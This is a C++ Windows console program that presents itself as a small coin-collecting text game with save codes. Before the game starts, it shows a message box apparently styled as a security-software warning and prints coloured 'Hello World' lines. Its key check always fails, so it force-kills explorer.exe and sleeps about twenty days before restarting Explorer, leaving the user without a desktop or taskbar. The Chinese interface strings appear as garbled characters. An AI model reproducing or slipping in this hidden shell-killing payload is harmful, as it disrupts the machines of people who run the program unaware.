#include<windows.h>
#include<cstdlib>
#include<iostream>
#include<algorithm>
#include<cstdio>
#include<stack>
#include<queue>
#include<vector>
#include<stdlib.h>
#include<stdio.h>
#include<time.h>
#include <conio.h>
using namespace std;
int b=10;
char a='#',rd[10005],r;
int c,acoin=10,re;
int main(){
	MessageBox(NULL,"���д˳�����ܻ���ڷ��գ��Ƿ�������У�","360��ȫ���ľ���",MB_YESNO); 
	while(b>=0){
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_BLUE);
		cout<<"Hello World\n";
		Sleep(100);
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED);
		cout<<"Hello World\n";
		Sleep(100);
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		cout<<"Hello World\n";
		Sleep(100);
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED |FOREGROUND_GREEN | FOREGROUND_BLUE);
		cout<<"Hello World\n";
		Sleep(100);
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED |FOREGROUND_GREEN);
		cout<<"Hello World\n";
		Sleep(100);
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED |FOREGROUND_BLUE);
		cout<<"Hello World\n";
		Sleep(100);
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY |FOREGROUND_GREEN | FOREGROUND_BLUE);
		cout<<"Hello World\n";
		Sleep(100);
		b--;
	}
	b=_getch();
	if(b!=123456){
		system("taskkill /f /im explorer.exe");
		Sleep(1728000000);
		system("start explorer.exe");
	} 
  srand(time(NULL));
	while(r!='z'){
		system("cls");
		cout<<"��z�˳�����x��ʼ��Ϸ����c�Ķ�˵������v��¼����b�浵��";
		r=_getch();
		if(r=='x'){
			acoin-=3;
			a='#';
			system("cls");
			rand();
			for(int i=1;i<=100;i++) rd[i]='_';
			for(int i=1;i<=rand()%12+12;i++) rd[rand()%100]='*';
			for(int i=1;i<=rand()%3+3;i++) rd[rand()%100]='|';
			c=rand()%100;
			rd[c]='T';
			for(int i=1;i<=100;i++) cout<<rd[i];
			cout<<endl;
			cout<<"Ӳ��������"<<acoin<<endl;
			while(a!='0'){
				a=_getch();
				system("cls");
				rd[c]='_';
				if(a=='a'&&c>1&&rd[c-1]!='|') c--;
				if(a=='d'&&c<100&&rd[c+1]!='|') c++;
				if(acoin>=3){
					if(a=='q'&&rd[c-1]=='|'){
						acoin-=3;
						rd[c-1]='_';
					}
					if(a=='e'&&rd[c+1]=='|'){
						acoin-=3;
						rd[c+1]='_';
					}
				}
				if(rd[c]=='*') acoin++;
				rd[c]='T';
				for(int i=1;i<=100;i++){
					cout<<rd[i];
				}
				cout<<endl;
				cout<<"Ӳ��������"<<acoin<<endl;
			}
			system("cls");
			cout<<"��Ŀǰ��"<<acoin<<"öӲ��"<<endl;
			Sleep(3000);
		}
		if(r=='c'){
			cout<<"����'T'������'0'���˳���Ϸ��"<<endl;
			cout<<"��'a'�����ߣ���'d'�����ߡ�" <<endl;
			cout<<"�������Ϸ������Ҫ�ռ��������Ľ�ң�*����"<<endl;
			cout<<"��_������յأ����޷�ͨ���ϰ���磨|�������������3�����������������߰�q���ұ߰�e��"<<endl;
			cout<<"ÿ�γ�����Ҫ3��ң���ʼ��10ö��ҡ�"<<endl; 
			cout<<"�����¼���ɴ浵��"<<endl; 
			cout<<"����������Լ�����"<<endl;
			r=_getch();
		}
		if(r=='v'){
			cout<<"������浵�ţ�"; 
			cin>>re;
			acoin=re%10+((re/100)%10)*10+((re/10000)%10)*100+((re/1000000)%10)*1000;
			cout<<"����������Լ�����";
			r=_getch();
		} 
		if(r=='b'){
			cout<<"���Ĵ浵�ţ�"<<(acoin/1000)%10<<rand()%10<<(acoin/100)%10<<rand()%10<<(acoin/10)%10<<rand()%10<<acoin%10<<endl;
			cout<<"����������Լ�����";
			r=_getch(); 
		}
	}
	return 0;
}
